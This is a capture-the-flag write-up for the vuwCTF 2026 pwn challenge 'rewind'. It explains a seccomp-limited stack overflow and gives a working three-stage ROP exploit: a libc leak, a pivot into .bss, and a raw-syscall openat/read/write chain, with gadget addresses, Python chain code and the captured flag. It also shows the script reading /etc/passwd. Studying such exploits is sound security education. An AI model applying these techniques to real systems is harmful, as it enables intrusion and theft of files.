# rewind — vuwCTF 2026 (pwn)

> You - lucky player - get to take home a brand new moose! Too bad if you don't have enough space. Choose a name!
>
> Author: **xaraneo**
>
> `nc rewind.challenges.2026.vuwctf.com 9966`

**Flag:** `VuwCTF{R0p_R3w1nD1ng_R0cks}`

**TL;DR** — A 152-byte stack overflow leaves only 144 bytes (18 gadgets) of ROP space, and a
seccomp filter kills anything that isn't `openat`/`read`/`write`/`sendfile`/`exit_group`. Each
stage therefore *rewinds* by returning into `main()` for a fresh `read()`: stage 1 leaks libc
through `puts(puts@got)`, stage 2 stages a full-size chain into `.bss` and pivots onto it with
`pop rsp`, stage 3 runs an open/read/write chain built from raw syscalls.

---

## Table of contents

- [Files](#files)
- [Recon](#recon)
- [Source analysis](#source-analysis)
  - [The seccomp filter](#the-seccomp-filter)
  - [The overflow](#the-overflow)
  - [The build script](#the-build-script)
- [Stack layout](#stack-layout)
- [Constraints and plan](#constraints-and-plan)
- [Gadget hunt](#gadget-hunt)
- [Stage 1 — leaking libc](#stage-1--leaking-libc)
- [Stage 2 — buying space with a stack pivot](#stage-2--buying-space-with-a-stack-pivot)
- [Stage 3 — the ORW chain](#stage-3--the-orw-chain)
- [Putting it together](#putting-it-together)
- [Notes, gotchas and alternatives](#notes-gotchas-and-alternatives)

---

## Files

| File | Notes |
| --- | --- |
| `rewind` | the challenge binary (x86-64, dynamically linked, not stripped) |
| `rewind.c` | full source |
| `build.sh` | how it was compiled — **important**, it injects a gadget |
| `libc.so.6` | remote libc, GNU libc **2.43** |
| `solve.py` | solution script (this write-up's exploit) |

## Recon

```console
$ file rewind
rewind: ELF 64-bit LSB executable, x86-64, dynamically linked,
        interpreter /lib64/ld-linux-x86-64.so.2, not stripped

$ pwn checksec rewind
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found      <-- overflow straight to the saved rip
    NX:         NX enabled           <-- no shellcode on the stack
    PIE:        No PIE (0x400000)    <-- binary gadgets/PLT/GOT at fixed addresses
    Stripped:   No

$ strings libc.so.6 | grep "GNU C Library"
GNU C Library (GNU libc) stable release version 2.43.
```

No canary + no PIE is an open invitation to ROP. The interesting question is *what* to ROP into,
which the source answers.

## Source analysis

### The seccomp filter

```c
if (!(ctx = seccomp_init(SCMP_ACT_KILL_PROCESS)))
  goto err;

WHITELIST_SYSCALL(openat);
WHITELIST_SYSCALL(read);
WHITELIST_SYSCALL(write);
WHITELIST_SYSCALL(sendfile);
WHITELIST_SYSCALL(exit_group);
```

Default action is `SCMP_ACT_KILL_PROCESS`, and the whitelist has no `execve`/`execveat`, no
`mmap`/`mprotect`, and no `getdents64`. So:

* **No shell.** One-gadget / `system("/bin/sh")` is dead on arrival.
* **Open-Read-Write is the only way out.** Read the flag file and print it to fd 1.
* **No directory listing** (`getdents64` is blocked and `read()` on a directory fd returns
  `EISDIR`), so the flag's filename has to be guessed — `/flag.txt` turned out to be right.

Also worth noting: the filter is installed behind a `static bool init` guard, so calling
`init_filter()` again is a no-op. That matters because the exploit re-enters `main()` repeatedly.

```c
void init_filter()
{
  static bool init = false;
  if (init)
    return;
  ...
```

### The overflow

```c
#define BFSZ 208
int main()
{
  char bf[BFSZ];

  setvbuf(stdout, nullptr, _IONBF, 0);
  init_filter();

  puts("name your moose: ");
  read(STDIN_FILENO, bf, BFSZ+152);   // <-- 360 bytes into a 208-byte buffer
  puts("your mooses name is:");
  puts(bf);
  puts("congrats!");

  return SUCCESS;
}
```

`read()` accepts `208 + 152 = 360` bytes into a 208-byte buffer — a textbook 152-byte overflow.
Two extra properties are useful:

1. `puts(bf)` echoes the buffer back, which is a free *output* primitive for leaks that live in
   the buffer (though the real leak below uses `puts@plt` from the chain instead).
2. `setvbuf(stdout, ..., _IONBF, 0)` makes stdout unbuffered, so leaked bytes arrive immediately.

The compiler-visible disassembly confirms the offsets:

```asm
00000000004012b8 <main>:
  4012b8:  push   rbp
  4012b9:  mov    rbp,rsp
  4012bc:  sub    rsp,0xd0                     ; 208 bytes of locals
  ...
  4012f5:  lea    rax,[rbp-0xd0]               ; bf == rbp-0xd0 == rsp
  4012fc:  mov    edx,0x168                    ; 360
  401301:  mov    rsi,rax
  401304:  mov    edi,0x0
  401309:  call   401080 <read@plt>
  ...
  401340:  leave
  401341:  ret
  401342:  pop    rdi                          ; <-- not reachable, but very much usable
  401343:  ret
```

### The build script

```bash
gcc -fno-stack-protector -Wno-stringop-overflow -S rewind.c -o rewind.s
sed -i -e '/main:/,/cfi_endproc/{/ret/a\ \tpop %rdi\n\tret' -e '}' rewind.s
gcc -no-pie -lseccomp rewind.s -o rewind
```

The `sed` line appends `pop %rdi ; ret` right after `main`'s `ret` at the assembly level. That's
the author handing over the one gadget the binary otherwise lacks — **`0x401342: pop rdi ; ret`**.
It's needed because this libc (2.43) does *not* contain a bare `pop rdi ; ret`:

```console
$ python3 -c "from pwn import *; print(list(ELF('./libc.so.6').search(b'\x5f\xc3', executable=True)))"
[]                                  # no 'pop rdi ; ret' anywhere in libc's executable pages
```

## Stack layout

`bf` sits exactly at `rsp` after the prologue, so the layout inside our 360 controllable bytes is:

```
 offset  0                                   208   216                        360
         +------------------------------------+-----+--------------------------+
         |  char bf[208]                      | rbp |  saved rip + ROP chain   |
         +------------------------------------+-----+--------------------------+
                                              ^     ^                          ^
                                       bf+0xd0|     |bf+0xd8                   |read() limit
                                              |     |
                                    saved rbp -+     +- return address of main()
```

* **Offset to saved rip:** `0xd0 + 8 = 216`
* **ROP budget after the overflow:** `360 - 216 = 144` bytes = **18 qwords**

`bf` is 16-byte aligned (`rsp` was 16-aligned after `push rbp`, and `sub rsp,0xd0` keeps that), which
matters for `movaps` alignment later.

## Constraints and plan

18 gadget slots is not much. A straightforward ORW chain (three syscalls, each needing
`rdi`/`rsi`/`rdx`) is roughly 24–30 qwords once `pop rdx` has to be synthesized — it does not fit.
And nothing can be done at all before libc is leaked, since the binary contains almost no gadgets:

```console
$ ROPgadget --binary rewind | grep -E ": (pop|leave|ret|syscall)"
0x00000000004012b6 : leave ; ret
0x000000000040117d : pop rbp ; ret
0x0000000000401342 : pop rdi ; ret
0x000000000040101a : ret
```

No `pop rsi`, no `pop rdx`, no `syscall`. So the exploit is built around the challenge's own name —
**rewind**: every chain ends by returning to `main()` (`0x4012b8`), which gives another prompt and
another 360-byte `read()`. The seccomp `static` guard makes re-entry free, and nothing else in
`main()` gets in the way.

| Stage | Budget | Goal |
| --- | --- | --- |
| 1 | 18 qwords | `puts(puts@got)` → libc base, then return to `main` |
| 2 | 18 qwords | `read(0, .bss, 0x600)` + `pop rsp` pivot → unlimited chain space |
| 3 | unlimited | `openat` / `read` / `write` per candidate path, then `exit_group` |

## Gadget hunt

Binary (fixed addresses, no PIE):

| Address | Gadget |
| --- | --- |
| `0x401342` | `pop rdi ; ret` (injected by `build.sh`) |
| `0x40101a` | `ret` (stack alignment) |
| `0x401050` | `puts@plt` |
| `0x401080` | `read@plt` |
| `0x404010` | `puts@got` |
| `0x4012b8` | `main` |

libc 2.43 (offsets from the provided `libc.so.6`):

| Offset | Gadget | Used for |
| --- | --- | --- |
| `0x275ed` | `pop rsi ; pop rbp ; ret` | arg 2 (costs one junk qword) |
| `0xd5d07` | `pop rax ; ret` | syscall number / scratch |
| `0x129b27` | `mov rdx, rax ; ret` | arg 3 — the substitute for the missing clean `pop rdx` |
| `0x369c5` | `pop rsp ; ret` | stack pivot |
| `0x94606` | `syscall ; ret` | the actual syscalls |

`pop rdx ; ret` does not exist in a clean form in 2.43 — every candidate has a side effect such as
`add byte ptr [rax], al` or `add dword ptr [rcx + 0x39], ecx`, which would need a writable pointer
parked in `rax`/`rcx` first. The `pop rax ; ret` → `mov rdx, rax ; ret` pair is cheaper and, as a
bonus, `mov rdx, rax` doubles as "copy the return value of `read()` into the length argument of
`write()`".

The scratch area is the tail of the RW page. The RW `LOAD` segment ends at `0x404060`, but mapping
is page-granular, so `0x404060 – 0x404fff` is mapped, writable and zeroed:

```console
$ readelf -lW rewind | grep RW
LOAD  0x002dd8 0x0000000000403dd8 ... 0x000278 0x000288 RW  0x1000
```

The exploit uses `0x404100` for the staged chain and `0x404e00` as the flag buffer.

## Stage 1 — leaking libc

`puts@got` is already resolved by the time our chain runs (the program has called `puts` three
times), so a classic `puts(puts@got)` leak works, and the chain ends by returning to `main`:

```python
send_stage(io, [RET, POP_RDI, PUTS_GOT, PUTS_PLT, MAIN])
```

**Why the leading `RET`.** `bf` is 16-byte aligned, so the saved rip sits at `bf+216`. Entering
`puts` directly from slot 0 would put `rsp ≡ 0 (mod 16)` at function entry instead of the required
`≡ 8 (mod 16)`, and glibc's `puts` uses `movaps`, which faults on a misaligned stack. One extra
`ret` shifts the whole chain by 8 bytes and fixes it.

Output ordering is worth being careful about — the chain only runs *after* `main` returns, so the
leak arrives after `congrats!`:

```
your mooses name is:
AAAAAA...            <- puts(bf): 216 'A's, then stops at the first NUL in the chain
congrats!
@\xf1\x82#\x7f       <- puts(puts@got)  <- the leak
name your moose:     <- main() again
```

```python
io.recvuntil(b'congrats!\n')
libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - libc.symbols['puts']
```

## Stage 2 — buying space with a stack pivot

With libc known, the second 18-slot chain does one job: pull a much bigger chain into `.bss` and
move `rsp` onto it. Eleven slots:

```python
send_stage(io, [
    POP_RAX, 0x600, MOV_RDX,        # rdx = 0x600
    POP_RDI, 0,                     # rdi = 0 (stdin)
    POP_RSI, STAGE, 0,              # rsi = 0x404100   (trailing 0 = junk rbp)
    READ_PLT,                       # read(0, 0x404100, 0x600)
    POP_RSP, STAGE,                 # rsp = 0x404100 -> execute what we just read
])
```

`pop rsp ; ret` pops `STAGE` into `rsp` and then `ret`s into `[STAGE]`, i.e. the first qword of the
staged chain becomes the next gadget. From here the chain size is limited only by the read length.

> **Practical note:** stdin is a socket, so a single `read()` returns whatever arrived in the first
> TCP segment. The stage-3 blob is deliberately kept under ~1.4 KB (one MSS) so it is delivered in
> one piece; otherwise the pivot would jump into a half-written chain.

## Stage 3 — the ORW chain

Raw syscalls, since libc's `open`/`read`/`write` wrappers are not exported as usable symbols in this
stripped libc. `open` is *not* in the whitelist, so `openat(AT_FDCWD, path, O_RDONLY)` is used —
which is what glibc's `open()` compiles down to anyway. `r10` (the mode argument) is left as garbage
because the kernel ignores it without `O_CREAT`.

```python
def orw(path_addr, buf=FLAGBUF, size=0x100):
    return [
        POP_RDI, constants.AT_FDCWD,            # -100
        POP_RSI, path_addr, 0,
        POP_RAX, 0, MOV_RDX,                    # rdx = O_RDONLY
        POP_RAX, constants.SYS_openat,          # 257
        SYSCALL,

        POP_RDI, 3,                             # fd 3
        POP_RSI, buf, 0,
        POP_RAX, size, MOV_RDX,
        POP_RAX, constants.SYS_read,            # 0
        SYSCALL,

        MOV_RDX,                                # rdx = bytes actually read
        POP_RDI, 1,                             # stdout
        POP_RSI, buf, 0,
        POP_RAX, constants.SYS_write,           # 1
        SYSCALL,
    ]
```

Two small tricks make the "guess the filename" problem painless:

* **fd is always 3.** A failed `openat` does not consume a descriptor, so the *first* path that
  exists gets fd 3 — the chain can hardcode it.
* **Failures are harmless.** If `openat` fails, the following `read(3, ...)` returns `-EBADF`,
  `mov rdx, rax` turns that into a huge unsigned length, and `write` fails with `EFAULT`/`EINVAL`.
  Nothing crashes, so several candidate paths can be tried back to back in a single connection.

The chain therefore concatenates one `orw()` block per candidate (`/flag.txt`, `/flag`, `flag.txt`,
`flag`), packs the NUL-terminated path strings immediately after the last gadget, and ends with
`exit_group(0)` for a clean exit instead of a seccomp kill:

```
0x404100  +---------------------------+
          |  orw("/flag.txt")         |  31 qwords
          |  orw("/flag")             |
          |  orw("flag.txt")          |
          |  orw("flag")              |
          |  exit_group(0)            |
          +---------------------------+
          |  "/flag.txt\0/flag\0..."  |  path strings
          +---------------------------+
0x404e00  |  flag buffer (0x100)      |
          +---------------------------+
```

## Putting it together

```console
$ python3 solve.py
[+] Opening connection to rewind.challenges.2026.vuwctf.com on port 9966: Done
[+] puts @ 0x7f2382cf1540
[+] libc @ 0x7f2382c6e000
[+] Receiving all data: Done (29B)
[*] output:
    VuwCTF{R0p_R3w1nD1ng_R0cks}
[+] VuwCTF{R0p_R3w1nD1ng_R0cks}
```

The full script is [`solve.py`](solve.py). It also takes `--paths` for other filenames and
`--host`/`--port` for local testing:

```console
$ python3 solve.py --paths /flag /etc/passwd /proc/self/maps
```

## Notes, gotchas and alternatives

* **Stack alignment.** Only stage 1 needs the alignment `ret`, because it calls into glibc's `puts`.
  Stage 3 touches nothing but `pop`/`mov`/`syscall` gadgets, where alignment is irrelevant.
* **Stack leak instead of `.bss`.** `puts(bf)` prints 216 bytes and then runs into the saved rbp,
  which leaks a stack address; the ORW chain could then be placed inside `bf` itself and reached
  with the same `pop rsp` pivot. Using `.bss` avoids a whole extra rewind, since its address is
  fixed by `-no-pie`.
* **`sendfile` was allowed for a reason.** `sendfile(1, fd, NULL, 0x100)` would collapse the
  read+write pair into a single syscall — handy if you want the whole chain to fit in the original
  144 bytes. It needs `rcx` (glibc wrapper) or `r10` (raw syscall) for the count, which is why
  `pop rcx ; ret` exists at libc `+0xa3c51`. The staged-chain approach makes that optimisation
  unnecessary.
* **Why not one-gadget / `system`?** `SCMP_ACT_KILL_PROCESS` on `execve` means the process dies
  instantly. Every path out of this challenge goes through file reads.
* **libc matching.** The gadget offsets are hardcoded for the provided 2.43 libc but `solve.py`
  re-verifies each one against the file at startup and re-searches if the bytes do not match, so
  pointing `--libc` at a different build still works.

## Lessons

1. Always read the build script — `build.sh` was a load-bearing part of the challenge, not
   packaging noise.
2. A "too small" ROP budget is usually not a dead end; returning into `main` (or any function that
   reads input) turns one overflow into arbitrarily many.
3. When a clean `pop rdx` is missing, look for `mov rdx, <reg>` pairs before resorting to
   side-effecting gadgets — and remember that `mov rdx, rax` right after a syscall is a free way to
   forward a return value into the next call's length argument.
